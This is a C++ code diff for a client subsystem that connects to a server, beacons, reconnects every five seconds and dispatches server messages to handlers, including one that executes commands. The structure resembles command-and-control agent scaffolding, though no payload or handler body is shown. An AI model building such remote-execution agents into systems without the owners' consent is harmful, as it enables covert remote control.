@@ -22,7 +22,7 @@ ClientSubsystem::ClientSubsystem(Config& config) : config_(config)
 	// enable debugging messages (depending on config?)
 	setupSubcomponents();
 	setupMessaging();
-	// setupEvents();
+	setupEvents();
 	// setupTasks();
 }
 
@@ -91,27 +91,41 @@ void ClientSubsystem::setupSubcomponents()
 // rename to setupCallbacks ? 
 void ClientSubsystem::setupEvents()
 {
-	/*
-	transportLayer_->setReceiveCallback([this](RawByteBuffer& bytes)
-		{
-			messageParser_->handle(bytes);
-		}
-	);*/
-
 	transportLayer_->setOnMessage([&](const RawByteBuffer& msg)
 	{
+			std::cout << "transportLayer_->setOnMessage" << std::endl;
 			messageParser_->handle(msg);
 	});
 
 	messageParser_->setOnMessage([&](const InternalMessage& msg)
 	{
+			std::cout << "dispatch_->setOnMessage" << std::endl;
 			dispatcher_->dispatch(msg);
 	});
 
+
+	//////////////////////////////////////
+	// TODO: controller should have a enum block? 
+	// that way we can use one overloaded handle function
+
+
 	dispatcher_->registerHandler(MessageType::DEFAULT, [&](const InternalMessage& msg)
-		{
-			controller_->handleDefault(msg);
-		});
+	{
+		std::cout << "dispatch_->registerHandler" << std::endl;
+		controller_->handleDefault(msg);
+	});
+
+	dispatcher_->registerHandler(MessageType::NONE, [&](const InternalMessage& msg)
+	{
+		std::cout << "dispatch_->registerHandler" << std::endl;
+		controller_->handleNone(msg);
+	});
+
+	dispatcher_->registerHandler(MessageType::EXECUTE_COMMAND, [&](const InternalMessage& msg)
+	{
+		std::cout << "dispatch_->registerHandler" << std::endl;
+		controller_->handleExecuteCommand(msg);
+	});
 }
 
 void ClientSubsystem::setupTasks()
@@ -156,13 +170,23 @@ void ClientSubsystem::run() // TODO: rename to start??
 		Sleep(5000);
 	}*/
 
+	std::cout << "ClientSubsystem::run()" << std::endl;
+
 	while (true)
 	{
-		transportLayer_->update(); // this just receives messages from server
+		if (!transportLayer_->isConnected())
+		{
+			transportLayer_->connect();
+		}
 
-		// TODO:
-		// transportLayer_->receive(); ?
-
-		transportLayer_->beacon();
+		if (transportLayer_->isConnected())
+		{
+			transportLayer_->run();
+			//transportLayer_->update(); // this just receives messages from server
+			// TODO:
+			// transportLayer_->receive(); ?
+			// transportLayer_->beacon();
+		}
+		Sleep(5000);
 	}
 }
